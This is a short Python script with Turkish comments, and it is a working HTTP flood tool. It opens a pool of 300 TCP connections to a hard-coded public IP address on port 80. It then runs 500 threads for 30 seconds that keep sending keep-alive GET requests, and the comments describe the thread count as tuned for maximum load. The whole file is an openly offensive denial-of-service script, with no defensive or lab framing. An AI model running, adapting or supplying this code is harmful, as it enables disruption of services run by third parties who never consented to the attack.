import socket
import threading
import time
import queue

# Hedef IP ve port
host = '142.132.142.224'  # https:// kısmını kaldırdık
port = 80

# Bağlantı havuzu (connection pool) boyutu
POOL_SIZE = 300  # Bağlantı havuzunun boyutunu ihtiyaca göre artırdık

# Bağlantı havuzu
connection_pool = queue.Queue(maxsize=POOL_SIZE)

# Bağlantı gönderen fonksiyon
def create_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)  # Timeout değerini 1 saniyeye çekerek işlem hızını artırdık
    try:
        s.connect((host, port))
        return s
    except Exception as e:
        print(f"Connection failed: {e}")
        return None

# Bağlantıyı havuza ekleyin
def init_pool():
    for _ in range(POOL_SIZE):
        conn = create_connection()
        if conn:
            connection_pool.put(conn)

# Bağlantı gönderme fonksiyonu
def send_packet():
    try:
        # Havuzdan bir bağlantı al
        conn = connection_pool.get(timeout=1)  # Timeout değerini 1 saniye yaptık
        if conn:
            request = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n"
            conn.sendall(request.encode())
            # Bağlantıyı tekrar havuza koy
            connection_pool.put(conn)
        else:
            print("No available connection in pool")
    except Exception as e:
        print(f"Error during packet sending: {e}")

# Flood fonksiyonu (çoklu thread ile)
def flood(threads, duration):
    end_time = time.time() + duration  # Süre bitişi

    def thread_func():
        while time.time() < end_time:
            send_packet()

    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=thread_func)
        thread.daemon = True  # Allow thread to exit when main program exits
        thread.start()
        threads_list.append(thread)

    # Thread'leri başlatıyoruz
    for thread in threads_list:
        thread.join(duration)  # Set a join timeout equal to flood duration

if __name__ == "__main__":
    # İlk başta havuzu başlat
    init_pool()

    # CPU'nuzun 2 çekirdeği olduğunu göz önünde bulundurarak, 400-500 thread ideal olabilir
    # Flood işlemi
    flood(threads=500, duration=30)  # 500 thread ile 30 saniyelik flood
